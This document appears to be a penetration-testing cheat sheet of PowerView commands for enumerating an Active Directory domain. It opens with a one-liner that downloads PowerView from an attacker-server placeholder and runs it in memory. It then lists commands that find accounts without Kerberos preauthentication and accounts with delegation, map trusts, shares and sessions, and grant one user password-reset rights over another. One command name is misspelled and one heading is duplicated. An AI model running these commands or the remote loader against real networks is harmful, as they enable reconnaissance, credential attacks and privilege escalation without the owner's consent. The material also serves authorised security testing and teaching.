# <h1 align="center" id="heading">Domain Enumeration with PowerView</h1>
### Load PowerView in Memory
```powershell
IEX(New-Object System.Net.WebClient).DownloadString("http://<attacker_server>/PowerView.ps1")
```

### Get all the effective members of a group, 'recursing down'
```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### All enabled users, returning distinguishednames
```powershell
Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
```
```powershell
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
```

### Check for users who don't have kerberos preauthentication set
```powershell
Get-DomainUser -PreauthNotRequired
```
```powershell
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

### Find any users/computers with constrained delegation st
```powershell
Get-DomainUser -TrustedToAuth
```
```powershell
Get-DomainComputer -TrustedToAuth
```

### Enumerate all servers that allow unconstrained delegation, and all privileged users that aren't marked as sensitive/not for delegation
```powershell
$Computers = Get-DomainComputer -Unconstrained
```
```powershell
$Users = Get-DomainUser -AllowDelegation -AdminCount
```

### Enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
```powershell
Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local
```

### Grant user 'will' the rights to change 'matt's password
```powershell
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
```

### Enumerate information on the current forest
```powershell
Get-Forest
```

### Enumerate all domains in the current forest
```powershell
Get-ForestDomain
```

### Enumerate information on the current domain
```powershell
Get-Domain
```

### Enumerate all domain trusts
```powershell
Get-DomainTrust
```

### Recursively map all domain trusts
```powershell
Get-DomainTrustMapping
```

### Find users in groups outside of the given domain (outbound access)
```powershell
Get-DomainForeignUser
```

### Find groups with users outside of the given domain (inbound access)
```powershell
Get-DomainForeignGroupMember -Domain target.domain.com
```

### Return domain OUs
```powershell
Get-DomainOUT
```

### Return domain GPOs
```powershell
Get-DomainGPO
```

### Find likely file servers based on user properties
```powershell
Get-DomainFileServer
```

### Enumerate shares on a specific machine
```powershell
Get-NetShare <X>
```

### Enumerate shares on a specific machine
```powershell
Get-NetSession <X>
```

### Enumerate RDP sessions (and source IPs)
```powershell
Get-NetRDPSession <X>
```
